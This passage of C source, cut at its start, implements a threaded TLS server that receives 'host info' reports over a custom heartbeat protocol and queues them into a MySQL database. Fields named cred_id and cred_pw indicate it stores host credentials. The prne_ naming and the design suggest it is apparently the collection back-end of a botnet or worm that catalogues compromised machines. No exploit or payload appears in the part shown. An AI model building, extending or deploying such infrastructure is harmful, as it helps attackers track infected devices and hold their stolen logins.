		db_sync_msg(ctx, q_str);
	}

	ret = true;
	if (mysql_real_query(&ctx->c, q_str, q_len)) {
		goto SQL_ERR;
	}
	while (true) {
		f_ret = mysql_next_result(&ctx->c);
		if (f_ret == 0) {
			continue;
		}
		else if (f_ret == -1) {
			break;
		}
		else {
			goto SQL_ERR;
		}
	}
	sql_err = false;
SQL_ERR:
	if (sql_err && prog_conf.verbose >= PRNE_VL_ERR) {
		report_mysql_err(&ctx->c);
	}

END: // CATCH
	prne_free_host_cred(&hc);
	prne_free(qv.cred_id);
	prne_free(qv.cred_pw);
	prne_free(qv.flags);
	prne_free(q_str);

	return ret;
}

static void *db_thread_main (void *ctx_p) {
	db_ctx_t *ctx = (db_ctx_t*)ctx_p;

	assert(!mysql_thread_init());

	if (prog_conf.verbose >= PRNE_VL_DBG0) {
		db_sync_msg(ctx, "Loop start.");
	}

	while (true) {
		db_qe_t *e;

		pthread_mutex_lock(&ctx->lock);
		if (ctx->q.size == 0) {
			if (ctx->term) {
				pthread_mutex_unlock(&ctx->lock);
				break;
			}
			pthread_cond_wait(&ctx->cv, &ctx->lock);
		}
		if (ctx->q.head != NULL) {
			e = (db_qe_t*)ctx->q.head->element;
			prne_llist_erase(&ctx->q, ctx->q.head);
		}
		else {
			e = NULL;
		}
		pthread_mutex_unlock(&ctx->lock);

		if (e != NULL) {
			handle_db_qe(ctx, e);

			prne_htbt_free_host_info(&e->hi);
			prne_free(e);
		}
	}

	if (prog_conf.verbose >= PRNE_VL_DBG0) {
		db_sync_msg(ctx, "Loop end.");
	}

	mysql_thread_end();

	return NULL;
}

static void free_client_ctx (client_ctx_t *ctx) {
	prne_free_iobuf(ctx->ib + 0);
	prne_free_iobuf(ctx->ib + 1);
	prne_close(ctx->sck);
	mbedtls_ssl_free(&ctx->ssl);
}

static void incre_conn_ctr (const ssize_t n) {
	pthread_mutex_lock(&prog_g.conn_ctr.lock);
	prog_g.conn_ctr.cnt += n;
	pthread_mutex_unlock(&prog_g.conn_ctr.lock);
}

static prne_llist_entry_t *pop_client_ctx (
	th_ctx_t *ctx,
	prne_llist_entry_t *e)
{
	client_ctx_t *c = (client_ctx_t*)e->element;
	prne_llist_entry_t *ret;

	free_client_ctx(c);
	prne_free(c);
	ret = prne_llist_erase(&ctx->c_list, e);
	incre_conn_ctr(-1);

	return ret;
}

static bool resize_pfd_arr (th_ctx_t *ctx, const size_t ny_size) {
	void *ny = prne_realloc(
		ctx->pfd,
		sizeof(struct pollfd),
		ny_size);

	if (ny_size > 0 && ny == NULL) {
		if (prog_conf.verbose >= PRNE_VL_ERR) {
			sync_perror("** resize_pfd_arr()");
		}
		return false;
	}
	ctx->pfd = (struct pollfd*)ny;
	return true;
}

static void client_sync_msg (client_ctx_t *c, const char *msg) {
	pthread_mutex_lock(&prog_g.stdio_lock);
	fprintf(stderr, "client@%"PRIxPTR": %s\n", (uintptr_t)c, msg);
	pthread_mutex_unlock(&prog_g.stdio_lock);
}

static void client_sync_perror (client_ctx_t *c, const char *msg) {
	pthread_mutex_lock(&prog_g.stdio_lock);
	fprintf(
		stderr,
		"client@%"PRIxPTR" %s: %s\n",
		(uintptr_t)c,
		msg,
		strerror(errno));
	pthread_mutex_unlock(&prog_g.stdio_lock);
}

static void client_sync_mbedtls_err (
	const int err,
	const char *msg,
	const uintptr_t c)
{
	char str[256];

	str[0] = 0;
	mbedtls_strerror(err, str, sizeof(str));
	pthread_mutex_lock(&prog_g.stdio_lock);
	fprintf(
		stderr,
		"client@%"PRIxPTR" %s: %s\n",
		c,
		msg,
		str);
	pthread_mutex_unlock(&prog_g.stdio_lock);
}

static bool fab_client_status_rsp (
	client_ctx_t *c,
	const uint16_t id,
	const prne_htbt_status_code_t code,
	const int32_t err)
{
	prne_htbt_msg_head_t mh;
	prne_htbt_status_t status;
	size_t msg_len = 0;
	size_t actual;
	bool ret;

	prne_htbt_init_msg_head(&mh);
	prne_htbt_init_status(&status);
	mh.is_rsp = true;
	mh.id = id;
	mh.op = PRNE_HTBT_OP_STATUS;
	status.code = code;
	status.err = err;

	prne_htbt_ser_msg_head(NULL, 0, &actual, &mh);
	msg_len += actual;
	prne_htbt_ser_status(NULL, 0, &actual, &status);
	msg_len += actual;

	if (prne_alloc_iobuf(c->ib + 1, msg_len)) {
		prne_iobuf_zero(c->ib + 1);

		prne_htbt_ser_msg_head(
			c->ib[1].m + c->ib[1].len,
			c->ib[1].avail,
			&actual,
			&mh);
		prne_iobuf_shift(c->ib + 1, actual);
		prne_htbt_ser_status(
			c->ib[1].m + c->ib[1].len,
			c->ib[1].avail,
			&actual,
			&status);
		prne_iobuf_shift(c->ib + 1, actual);

		ret = true;
	}
	else {
		ret = false;
		if (prog_conf.verbose >= PRNE_VL_ERR) {
			client_sync_perror(c, "** proc_client_stream()");
		}
	}

	prne_htbt_free_msg_head(&mh);
	prne_htbt_free_status(&status);

	return ret;
}

static bool queue_hostinfo (
	client_ctx_t *client,
	prne_htbt_host_info_t *hi)
{
	bool ret = false;
	db_qe_t *qe = (db_qe_t*)prne_malloc(sizeof(db_qe_t), 1);
	pthread_mutex_t *lock = NULL;

	if (qe == NULL) {
		goto END;
	}

	memcpy(&qe->hi, hi, sizeof(prne_htbt_host_info_t));
	memcpy(&qe->sa, &client->sa, sizeof(struct sockaddr_in6));

	pthread_mutex_lock(&prog_g.db_ctx.lock);
	lock = &prog_g.db_ctx.lock;
	if (prog_g.db_ctx.q.size > prog_conf.db_q_size) {
		if (prog_conf.verbose >= PRNE_VL_WARN) {
			client_sync_msg(client, "** DB queue full!");
		}
		goto END;
	}
	if (prne_llist_append(&prog_g.db_ctx.q, (prne_llist_element_t)qe) == NULL) {
		if (prog_conf.verbose >= PRNE_VL_ERR) {
			client_sync_perror(client, "prne_llist_append()");
		}
		goto END;
	}
	pthread_cond_broadcast(&prog_g.db_ctx.cv);
	pthread_mutex_unlock(lock);
	lock = NULL;

	qe = NULL;
	prne_htbt_init_host_info(hi);
	ret = true;
END:
	if (lock != NULL) {
		pthread_mutex_unlock(lock);
	}
	prne_free(qe);

	return ret;
}

static int proc_client_hostinfo (
	th_ctx_t *ctx,
	client_ctx_t *c,
	const size_t off)
{
	prne_htbt_host_info_t hi;
	prne_htbt_ser_rc_t src;
	size_t actual;
	int ret = 0;

	prne_htbt_init_host_info(&hi);
// TRY
	src = prne_htbt_dser_host_info(
		c->ib[0].m + off,
		c->ib[0].len - off,
		&actual,
		&hi);
	switch (src) {
	case PRNE_HTBT_SER_RC_OK:
		if (prog_conf.verbose >= PRNE_VL_DBG0) {
			client_sync_msg(c, "< OP_HOST_INFO");
		}

		prne_iobuf_shift(c->ib + 0, -(off + actual));
		c->proto_state.hi_received = true;
		c->con_state = CS_CLOSE;
		if (!queue_hostinfo(c, &hi)) {
			if (prog_conf.verbose >= PRNE_VL_ERR) {
				client_sync_perror(c, "** queue_hostinfo()");
			}
		}
		break;
	case PRNE_HTBT_SER_RC_MORE_BUF:
		ret = 1;
		goto END;
	case PRNE_HTBT_SER_RC_FMT_ERR:
		ret = -2;
		goto END;
	default:
		if (prog_conf.verbose >= PRNE_VL_ERR) {
			client_sync_perror(c, "prne_htbt_dser_host_info()");
		}
		ret = -1;
		goto END;
	}

END: // CATCH
	prne_htbt_free_host_info(&hi);
	return ret;
}

static uint16_t gen_msgid (void *ctx) {
	uint16_t ret = PRNE_HTBT_MSG_ID_MIN;
	prne_rnd((prne_rnd_t*)ctx, (uint8_t*)&ret, sizeof(ret));
	return ret;
}

static int proc_client_stream (th_ctx_t *ctx, client_ctx_t *c) {
	prne_htbt_msg_head_t mh;
	prne_htbt_ser_rc_t src;
	size_t actual;
	int ret = 1;

	prne_htbt_init_msg_head(&mh);

// TRY
	src = prne_htbt_dser_msg_head(c->ib[0].m, c->ib[0].len, &actual, &mh);
	if (src == PRNE_HTBT_SER_RC_MORE_BUF) {
		goto END;
	}
	if (src != PRNE_HTBT_SER_RC_OK) {
		goto PROTO_ERR;
	}

	switch (mh.op) {
	case PRNE_HTBT_OP_SOLICIT:
		prne_iobuf_shift(c->ib + 0, -actual);
		if (mh.is_rsp || c->proto_state.hi_sent) {
			goto PROTO_ERR;
		}

		if (prog_conf.verbose >= PRNE_VL_DBG0) {
			client_sync_msg(c, "< OP_SOLICIT");
			client_sync_msg(c, "> OP_HOST_INFO");
		}

		mh.op = PRNE_HTBT_OP_HOST_INFO;
		mh.id = prne_htbt_gen_msgid(&ctx->rnd, gen_msgid);

		prne_htbt_ser_msg_head(NULL, 0, &actual, &mh);
		if (prne_alloc_iobuf(c->ib + 1, actual)) {
			prne_iobuf_zero(c->ib + 1);
			prne_htbt_ser_msg_head(
				c->ib[1].m,
				c->ib[1].avail,
				&actual,
				&mh);
			prne_iobuf_shift(c->ib + 1, actual);
			c->proto_state.hi_sent = true;
			ret = 0;
		}
		else {
			ret = -1;
			if (prog_conf.verbose >= PRNE_VL_ERR) {
				client_sync_perror(c, "** proc_client_stream()");
			}
		}

		break;
	case PRNE_HTBT_OP_HOST_INFO:
		if (!mh.is_rsp) {
			goto PROTO_ERR;
		}
		ret = proc_client_hostinfo(ctx, c, actual);
		if (ret == -2) {
			goto PROTO_ERR;
		}
		break;
	default:
		prne_iobuf_reset(c->ib + 0);
		if (fab_client_status_rsp(c, mh.id, PRNE_HTBT_STATUS_UNIMPL, 0)) {
			c->con_state = CS_SHUT;
		}
		else {
			ret = -1;
		}
		if (prog_conf.verbose >= PRNE_VL_WARN) {
			pthread_mutex_lock(&prog_g.stdio_lock);
			fprintf(
				stderr,
				"client@%"PRIxPTR": * unimplemented op code %d.\n",
				(uintptr_t)c,
				mh.op);
			pthread_mutex_unlock(&prog_g.stdio_lock);
		}
		goto END;
	}

	goto END;
PROTO_ERR:
	prne_iobuf_reset(c->ib + 0);
	if (fab_client_status_rsp(c, mh.id, PRNE_HTBT_STATUS_PROTO_ERR, 0)) {
		c->con_state = CS_SHUT;
	}
	else {
		ret = -1;
	}

	if (prog_conf.verbose >= PRNE_VL_ERR) {
		client_sync_msg(c, "** protocol error.");
	}
END: // CATCH
	prne_htbt_free_msg_head(&mh);
	return ret;
}

static int serve_client (
	th_ctx_t *ctx,
	client_ctx_t *c,
	const struct timespec now,
	const int revents)
{
	ssize_t f_ret;
	int ret;

	if (c->ib[1].len > 0 && revents & POLLOUT) {
		// consume out bufs
		f_ret = mbedtls_ssl_write(&c->ssl, c->ib[1].m, c->ib[1].len);
		if (f_ret < 0) {
			if (prne_mbedtls_is_nberr(f_ret)) {
				if (prog_conf.verbose >= PRNE_VL_DBG0) {
					client_sync_perror(c, "mbedtls_ssl_write()");
				}
				return -1;
			}
		}
		else if (f_ret == 0) {
			if (prog_conf.verbose >= PRNE_VL_DBG0 + 1) {
				client_sync_msg(c, "write EOF.");
			}
			if (prog_conf.verbose >= PRNE_VL_ERR) {
				client_sync_msg(
					c,
					"** client shutdown whilst there's still data to send.");
			}
			return -1;
		}
		else {
			if (prog_conf.verbose >= PRNE_VL_DBG0 + 1 ) {
				pthread_mutex_lock(&prog_g.stdio_lock);
				if (prog_conf.verbose >= PRNE_VL_DBG0 + 2) {
					fprintf(
						stderr,
						"client@%"PRIxPTR": > %zd bytes: ",
						(uintptr_t)c,
						f_ret);
					for (ssize_t i = 0; i < f_ret; i += 1) {
						fprintf(stderr, "%02"PRIx8" ", c->ib[1].m[i]);
					}
					fprintf(stderr, "\n");
				}
				else {
					fprintf(
						stderr,
						"client@%"PRIxPTR": > %zd bytes.\n",
						(uintptr_t)c,
						f_ret);
				}
				pthread_mutex_unlock(&prog_g.stdio_lock);
			}

			prne_iobuf_shift(c->ib + 1, -f_ret);
		}
	}

	if (c->con_state != CS_PROC) {
		if (c->ib[1].len == 0) {
			c->con_state = CS_CLOSE;
		}
		return 0;
	}

	// process incoming data from clients
	if (c->ib[0].avail == 0) {
		if (prog_conf.verbose >= PRNE_VL_ERR) {
			client_sync_msg(c, "** no buffer left to process stream!");
		}
		return -1;
	}

	if (revents & POLLIN) {
		f_ret = mbedtls_ssl_read(
			&c->ssl,
			c->ib[0].m + c->ib[0].len,
			c->ib[0].avail);
		if (f_ret < 0) {
			if (!prne_mbedtls_is_nberr(f_ret)) {
				if (prog_conf.verbose >= PRNE_VL_DBG0) {
					client_sync_perror(c, "mbedtls_ssl_read()");
				}
				return -1;
			}
			return 1;
		}
		else if (f_ret == 0) {
			c->con_state = CS_SHUT;
			if (prog_conf.verbose >= PRNE_VL_DBG0 + 1) {
				client_sync_msg(c, "read EOF.");
			}
		}

		if (prog_conf.verbose >= PRNE_VL_DBG0 + 1 && f_ret > 0) {
			pthread_mutex_lock(&prog_g.stdio_lock);
			if (prog_conf.verbose >= PRNE_VL_DBG0 + 2) {
				fprintf(
					stderr,
					"client@%"PRIxPTR": < %zd bytes: ",
					(uintptr_t)c,
					f_ret);
				for (ssize_t i = 0; i < f_ret; i += 1) {
					fprintf(stderr, "%02"PRIx8" ", c->ib[0].m[i + c->ib[0].len]);
				}
				fprintf(stderr, "\n");
			}
			else {
				fprintf(
					stderr,
					"client@%"PRIxPTR": < %zd bytes.\n",
					(uintptr_t)c,
					f_ret);
			}
			pthread_mutex_unlock(&prog_g.stdio_lock);
		}

		prne_iobuf_shift(c->ib + 0, f_ret);
	}

	while ((ret = proc_client_stream(ctx, c)) == 0) {
		c->last_op = now;
	}

	return ret;
}

static void client_thread_tick (th_ctx_t *ctx) {
	const struct timespec now = prne_gettime(CLOCK_MONOTONIC);
	nfds_t pfd_ptr;
	int f_ret;
	long poll_to = -1;
	bool pending = false;

	// free expired clients
	// calculate poll() timeout
	for (prne_llist_entry_t *e = ctx->c_list.head; e != NULL;) {
		client_ctx_t *c = (client_ctx_t*)e->element;
		const struct timespec to_tp = prne_add_timespec(
			c->last_op,
			prog_conf.sck_op_timeout);

		if (prne_cmp_timespec(now, to_tp) > 0) {
			if (prog_conf.verbose >= PRNE_VL_DBG0) {
				client_sync_msg(c, "timed out(inactive).");
			}
			e = pop_client_ctx(ctx, e);
		}
		else {
			const struct timespec td = prne_sub_timespec(to_tp, now);
			const long ms_to = prne_timespec_ms(td);

			if (poll_to < 0 || poll_to > ms_to) {
				poll_to = ms_to;
			}

			e = e->next;
		}
	}

	// build pfd and do handshake
	pfd_ptr = 0;
	for (prne_llist_entry_t *e = ctx->c_list.head; e != NULL;) {
		client_ctx_t *c = (client_ctx_t*)e->element;
		short events, revents = 0;

		switch (c->con_state) {
		case CS_HANDSHAKE:
			errno = 0;
			f_ret = mbedtls_ssl_handshake(&c->ssl);
			switch (f_ret) {
			case 0:
				if (!prne_nstreq(
					mbedtls_ssl_get_alpn_protocol(&c->ssl),
					PRNE_HTBT_TLS_ALP))
				{
					if (prog_conf.verbose >= PRNE_VL_WARN) {
						client_sync_msg(c, "* ALPN error.");
					}
					e = pop_client_ctx(ctx, e);
					continue;
				}
				c->con_state = CS_PROC;
				c->last_op = now;

				if (prog_conf.verbose >= PRNE_VL_DBG0) {
					client_sync_msg(c, "mbedtls_ssl_handshake() successful.");
				}
				/* fall-through */
			case MBEDTLS_ERR_SSL_WANT_READ:
				events = POLLIN;
				e = e->next;
				break;
			case MBEDTLS_ERR_SSL_WANT_WRITE:
				events = POLLOUT;
				e = e->next;
				break;
			default:
				if (prog_conf.verbose >= PRNE_VL_WARN) {
					if (errno == 0) {
						client_sync_mbedtls_err(
							f_ret,
							"* mbedtls_ssl_handshake()",
							(uintptr_t)c);
					}
					else {
						switch (errno) {
						case EPIPE:
							break;
						default:
							client_sync_perror(c, "* mbedtls_ssl_handshake()");
						}
					}
				}
				e = pop_client_ctx(ctx, e);
				continue;
			}
			break;
		case CS_CLOSE:
			errno = 0;
			f_ret = mbedtls_ssl_close_notify(&c->ssl);
			switch (f_ret) {
			case MBEDTLS_ERR_SSL_WANT_READ:
				events = POLLIN;
				e = e->next;
				break;
			case MBEDTLS_ERR_SSL_WANT_WRITE:
				events = POLLOUT;
				e = e->next;
				break;
			default:
				if (f_ret == 0) {
					shutdown(c->sck, SHUT_RDWR);

					if (prog_conf.verbose >= PRNE_VL_DBG0) {
						client_sync_msg(c, "graceful close.");
					}
				}
				else if (prog_conf.verbose >= PRNE_VL_WARN) {
					if (errno == 0) {
						client_sync_mbedtls_err(
							f_ret,
							"* mbedtls_ssl_close_notify()",
							(uintptr_t)c);
					}
					else {
						switch (errno) {
						case EPIPE:
							break;
						default:
							client_sync_perror(
								c,
								"* mbedtls_ssl_close_notify()");
						}
					}
				}

				e = pop_client_ctx(ctx, e);
				continue;
			}
			break;
		case CS_SHUT:
			events = POLLOUT;
			e = e->next;
			break;
		case CS_PROC:
			if (mbedtls_ssl_check_pending(&c->ssl)) {
				events = POLLIN;
				revents = POLLIN;
				pending = true;
			}
			else if (c->ib[1].len > 0) {
				events = POLLOUT;
			}
			else {
				events = POLLIN;
			}
			e = e->next;
			break;
		default: abort();
		}

		ctx->pfd[pfd_ptr].fd = c->sck;
		ctx->pfd[pfd_ptr].events = events;
		ctx->pfd[pfd_ptr].revents = revents;
		pfd_ptr += 1;
	}
	ctx->pfd[pfd_ptr].fd = ctx->ihcp[0];
	ctx->pfd[pfd_ptr].events = POLLIN;
	pfd_ptr += 1;

	if (!pending) {
		// do poll
		f_ret = poll(ctx->pfd, pfd_ptr, (int)poll_to);
		if (f_ret < 0) {
			if (errno != EINTR) {
				if (prog_conf.verbose >= PRNE_VL_FATAL) {
					sync_perror("*** poll()@client_thread_tick()");
				}
				abort();
			}
			return;
		}
	}

	// serve
	pfd_ptr = 0;
	for (prne_llist_entry_t *e = ctx->c_list.head; e != NULL; pfd_ptr += 1) {
		client_ctx_t *c = (client_ctx_t*)e->element;

		switch (c->con_state) {
		case CS_PROC:
		case CS_SHUT:
			break;
		default:
			e = e->next;
			continue;
		}

		f_ret = serve_client(ctx, c, now, ctx->pfd[pfd_ptr].revents);

		if (f_ret < 0) {
			e = pop_client_ctx(ctx, e);
		}
		else {
			e = e->next;
		}
	}
}

static void do_take_client (th_ctx_t *ctx) {
	for (prne_llist_entry_t *e = ctx->p_list.head;
		e != NULL;
		e = e->next)
	{
		client_ctx_t *c = (client_ctx_t*)e->element;

		errno = 0;
// TRY
		if (!prne_alloc_iobuf(c->ib + 0, PRNE_HTBT_PROTO_MIN_BUF)) {
			goto ERR;
		}

		if (mbedtls_ssl_setup(&c->ssl, &prog_g.ssl.conf) != 0) {
			goto ERR;
		}
		mbedtls_ssl_set_bio(
			&c->ssl,
			&c->sck,
			prne_mbedtls_ssl_send_cb,
			prne_mbedtls_ssl_recv_cb,
			NULL);

		if (prne_llist_append(&ctx->c_list, e->element) == NULL) {
			goto ERR;
		}

		continue;
ERR: // CATCH
		if (prog_conf.verbose >= PRNE_VL_ERR) {
			sync_perror("** do_take_client()");
		}
		free_client_ctx(c);
		incre_conn_ctr(-1);
	}
	prne_llist_clear(&ctx->p_list);
}

static void *client_thread_main (void *ctx_p) {
	th_ctx_t *ctx = (th_ctx_t*)ctx_p;

	if (prog_conf.verbose >= PRNE_VL_DBG0) {
		pthread_mutex_lock(&prog_g.stdio_lock);
		fprintf(
			stderr,
			"c_th@%"PRIxPTR": Loop start.\n",
			(uintptr_t)ctx);
		pthread_mutex_unlock(&prog_g.stdio_lock);
	}

	while (true) {
		pthread_mutex_lock(&ctx->lock);
		while (read(ctx->ihcp[0], &sewage, 1) == 1);
		do_take_client(ctx);
		if (ctx->term && ctx->c_list.size == 0) {
			pthread_mutex_unlock(&ctx->lock);
			break;
		}
		pthread_mutex_unlock(&ctx->lock);

		if (!resize_pfd_arr(ctx, ctx->c_list.size + 1)) {
			if (prog_conf.verbose >= PRNE_VL_FATAL) {
				sync_perror("*** resize_pfd_arr()");
			}
			abort();
		}

		client_thread_tick(ctx);
	}

	if (prog_conf.verbose >= PRNE_VL_DBG0) {
		pthread_mutex_lock(&prog_g.stdio_lock);
		fprintf(
			stderr,
			"c_th@%"PRIxPTR": Loop end.\n",
			(uintptr_t)ctx);
		pthread_mutex_unlock(&prog_g.stdio_lock);
	}

	mysql_thread_end();

	return NULL;
}

static int init_threads (
	const size_t in_cnt,
	th_ctx_t **out_arr)
{
	uint8_t seed[PRNE_RND_WELL512_SEEDLEN];
	th_ctx_t *arr = (th_ctx_t*)prne_calloc(sizeof(th_ctx_t), in_cnt);

	if (arr == NULL) {
		return 1;
	}

	if ((errno = pthread_create(
		&prog_g.db_ctx.th,
		NULL,
		db_thread_main,
		&prog_g.db_ctx)) != 0)
	{
		return 1;
	}

	for (size_t i = 0; i < in_cnt; i += 1) {
		th_ctx_t *th_ctx = arr + i;

		if (pipe(th_ctx->ihcp) != 0 ||
			!prne_sck_fcntl(th_ctx->ihcp[0]) ||
			!prne_sck_fcntl(th_ctx->ihcp[1]))
		{
			return 1;
		}

		if (mbedtls_ctr_drbg_random(
			&prog_g.ssl.ctr_drbg,
			seed,
			sizeof(seed)) != 0)
		{
			return 1;
		}

		if ((errno = pthread_mutex_init(&th_ctx->lock, NULL)) != 0) {
			return 1;
		}
		prne_init_rnd(&th_ctx->rnd);
		prne_init_llist(&th_ctx->p_list);
		prne_init_llist(&th_ctx->c_list);

		if (!prne_rnd_alloc_well512(&th_ctx->rnd, seed)) {
			return 1;
		}
		if ((errno = pthread_create(
			&th_ctx->th,
			NULL,
			client_thread_main,
			th_ctx)) != 0)
		{
			return 1;
		}
	}

	*out_arr = arr;
	return 0;
}

static void join_threads (th_ctx_t **arr, const size_t cnt) {
	for (size_t i = 0; i < cnt; i += 1) {
		th_ctx_t *ctx = *arr + i;

		pthread_mutex_lock(&ctx->lock);
		ctx->term = true;
		write(ctx->ihcp[1], &sewage, 1);
		pthread_mutex_unlock(&ctx->lock);
	}
	for (size_t i = 0; i < cnt; i += 1) {
		th_ctx_t *ctx = *arr + i;

		pthread_join(ctx->th, NULL);
		pthread_mutex_destroy(&ctx->lock);
		prne_free(ctx->pfd);
		prne_free_llist(&ctx->p_list);
		prne_free_llist(&ctx->c_list);
		prne_free_rnd(&ctx->rnd);
	}
	prne_free(*arr);
	*arr = NULL;

	pthread_mutex_lock(&prog_g.db_ctx.lock);
	prog_g.db_ctx.term = true;
	pthread_cond_broadcast(&prog_g.db_ctx.cv);
	pthread_mutex_unlock(&prog_g.db_ctx.lock);
	pthread_join(prog_g.db_ctx.th, NULL);
}

static void pass_client_conn (
	th_ctx_t *th_arr,
	const size_t th_cnt,
	int fd,
	const struct sockaddr_in6 *sa)
{
	client_ctx_t *c_ctx = NULL;
	th_ctx_t *c_th_ctx;
	pthread_mutex_t *lock = NULL;

// TRY
	if (prog_g.conn_ctr.cnt >= prog_conf.max_conn) {
		if (prog_conf.verbose >= PRNE_VL_WARN) {
			static struct timespec last_max_conn_report;
			struct timespec d, now;

// since CLOCK_MONOTONIC could be either program start or system start
			now = prne_add_timespec(
				prne_gettime(CLOCK_MONOTONIC),
				prog_conf.report_int);

			d = prne_sub_timespec(
				now,
				last_max_conn_report);
			if (prne_cmp_timespec(d, prog_conf.report_int) > 0) {
				pthread_mutex_lock(&prog_g.stdio_lock);
				fprintf(
					stderr,
					"* Max connections reached! Dropping connection.\n");
				pthread_mutex_unlock(&prog_g.stdio_lock);

				last_max_conn_report = now;
			}
		}
		goto END;
	}

	c_ctx = prne_calloc(sizeof(client_ctx_t), 1);
	if (c_ctx == NULL) {
		if (prog_conf.verbose >= PRNE_VL_ERR) {
			sync_perror("** pass_client_conn()");
		}
		goto END;
	}
	c_ctx->last_op = prne_gettime(CLOCK_MONOTONIC);
	prne_init_iobuf(c_ctx->ib + 0);
	prne_init_iobuf(c_ctx->ib + 1);
	c_ctx->sck = fd;
	fd = -1;
	c_ctx->sa = *sa;
	inet_ntop(
		AF_INET6,
		&sa->sin6_addr,
		c_ctx->ipaddr_str,
		sizeof(c_ctx->ipaddr_str));
	mbedtls_ssl_init(&c_ctx->ssl);

	// find the least busy thread
	c_th_ctx = th_arr;
	for (size_t i = 1; i < th_cnt; i += 1) {
		th_ctx_t *th_ctx = th_arr + i;

		if (c_th_ctx->c_list.size + c_th_ctx->p_list.size >
			th_ctx->c_list.size + th_ctx->p_list.size)
		{
			c_th_ctx = th_ctx;
		}
	}

	pthread_mutex_lock(&c_th_ctx->lock);
	lock = &c_th_ctx->lock;

	if (prne_llist_append(
		&c_th_ctx->p_list,
		(prne_llist_element_t)c_ctx) == NULL)
	{
		goto END;
	}
	write(c_th_ctx->ihcp[1], &sewage, 1);
	incre_conn_ctr(1);

	if (prog_conf.verbose >= PRNE_VL_DBG0) {
		pthread_mutex_lock(&prog_g.stdio_lock);
		fprintf(
			stderr,
			"New client from [%s]:%"PRIu16" "
			"client@%"PRIxPTR", c_th@%"PRIxPTR", fd:%d\n",
			c_ctx->ipaddr_str,
			ntohs(sa->sin6_port),
			(uintptr_t)c_ctx,
			(uintptr_t)c_th_ctx,
			c_ctx->sck);
		pthread_mutex_unlock(&prog_g.stdio_lock);
	}

	c_ctx = NULL;
END: // CATCH
	if (lock != NULL) {
		pthread_mutex_unlock(lock);
	}
	prne_close(fd);
	if (c_ctx != NULL) {
		free_client_ctx(c_ctx);
		prne_free(c_ctx);
	}
}

int main (const int argc, const char **args) {
	int ret = 0;
	int fd = -1, f_ret;
	struct sockaddr_in6 sa;
	socklen_t sl;
	th_ctx_t *th_arr = NULL;
	size_t th_cnt = 0;
	struct pollfd pfd[2];

	if (argc < 2) {
		print_help(args[0], stderr);
		return 2;
	}

	if (mysql_library_init(0, NULL, NULL)) {
		fprintf(stderr, "*** mysql_library_init() failed!\n");
		return 1;
	}
	if (!mysql_thread_safe()) {
		fprintf(stderr, "*** mysql_thread_safe() returned false!\n");
		return 1;
	}

	mysql_init(&prog_g.db_ctx.c);
	prne_init_llist(&prog_g.db_ctx.q);
	mbedtls_x509_crt_init(&prog_g.ssl.ca);
	mbedtls_x509_crt_init(&prog_g.ssl.crt);
	mbedtls_pk_init(&prog_g.ssl.key);
	mbedtls_dhm_init(&prog_g.ssl.dh);
	mbedtls_ssl_config_init(&prog_g.ssl.conf);
	mbedtls_entropy_init(&prog_g.ssl.entropy);
	mbedtls_ctr_drbg_init(&prog_g.ssl.ctr_drbg);

	if ((errno = pthread_mutex_init(&prog_g.db_ctx.lock, NULL)) != 0 ||
		(errno = pthread_mutex_init(&prog_g.stdio_lock, NULL)) != 0 ||
		(errno = pthread_mutex_init(&prog_g.conn_ctr.lock, NULL)) != 0 ||
		(errno = pthread_mutex_init(&prog_g.db_ctx.lock, NULL)) != 0 ||
		(errno = pthread_cond_init(&prog_g.db_ctx.cv, NULL)) != 0)
	{
		if (prog_conf.verbose >= PRNE_VL_FATAL) {
			perror("*** pthread_mutex_init()");
		}
		abort();
	}

	if ((ret = setup_conf(args[1])) != 0 ||
		(ret = init_global()) != 0)
	{
		return 1;
	}
	init_signals();


	fd = prep_socket();
	if (fd < 0) {
		if (prog_conf.verbose >= PRNE_VL_FATAL) {
			perror("*** prep_socket()");
		}
		ret = 1;
		return 1;
	}

	if ((ret = init_threads(prog_conf.nb_thread, &th_arr)) != 0) {
		if (prog_conf.verbose >= PRNE_VL_FATAL) {
			perror("*** init_threads()");
		}
		return 1;
	}
	th_cnt = prog_conf.nb_thread;

	if (prog_conf.verbose >= PRNE_VL_DBG0) {
		pthread_mutex_lock(&prog_g.stdio_lock);
		fprintf(stderr, "Initialisation complete. Servicing ...\n");
		pthread_mutex_unlock(&prog_g.stdio_lock);
	}

	pfd[0].fd = fd;
	pfd[0].events = POLLIN;
	pfd[1].fd = sigpipe[0];
	pfd[1].events = POLLIN;
	while (true) {
		f_ret = poll(pfd, 2, -1);
		if (f_ret < 0) {
			if (errno == EINTR) {
				continue;
			}
			abort();
		}

		if (pfd[1].revents) {
			break;
		}
		if (pfd[0].revents == 0) {
			continue;
		}

		sl = sizeof(sa);
		f_ret = accept(fd, (struct sockaddr*)&sa, &sl);
		if (f_ret >= 0) {
			if (!prne_sck_fcntl(f_ret)) {
				if (prog_conf.verbose >= PRNE_VL_FATAL) {
					sync_perror("*** prne_sck_fcntl()");
				}
				abort();
			}
			pass_client_conn(th_arr, th_cnt, f_ret, &sa);
		}
		else if (prog_conf.verbose >= PRNE_VL_WARN) {
			sync_perror("accept()");
		}
	}

	if (prog_conf.verbose >= PRNE_VL_DBG0) {
		pthread_mutex_lock(&prog_g.stdio_lock);
		fprintf(stderr, "Loop end. Joining threads ...\n");
		pthread_mutex_unlock(&prog_g.stdio_lock);
	}
	join_threads(&th_arr, th_cnt);

	if (prog_conf.verbose >= PRNE_VL_DBG0) {
		pthread_mutex_lock(&prog_g.stdio_lock);
		fprintf(stderr, "Freeing resources ...\n");
		pthread_mutex_unlock(&prog_g.stdio_lock);
	}

	prne_close(fd);

	mysql_close(&prog_g.db_ctx.c);
	pthread_mutex_destroy(&prog_g.db_ctx.lock);
	pthread_mutex_destroy(&prog_g.conn_ctr.lock);
	pthread_mutex_destroy(&prog_g.stdio_lock);
	pthread_mutex_destroy(&prog_g.db_ctx.lock);
	pthread_cond_destroy(&prog_g.db_ctx.cv);
	mbedtls_ssl_config_free(&prog_g.ssl.conf);
	mbedtls_x509_crt_free(&prog_g.ssl.ca);
	mbedtls_x509_crt_free(&prog_g.ssl.crt);
	mbedtls_pk_free(&prog_g.ssl.key);
	mbedtls_dhm_free(&prog_g.ssl.dh);
	mbedtls_ctr_drbg_free(&prog_g.ssl.ctr_drbg);
	mbedtls_entropy_free(&prog_g.ssl.entropy);
	prne_free_llist(&prog_g.db_ctx.q);

	free_conf();
	prne_close(sigpipe[0]);
	prne_close(sigpipe[1]);

	mysql_library_end();

	return ret;
}
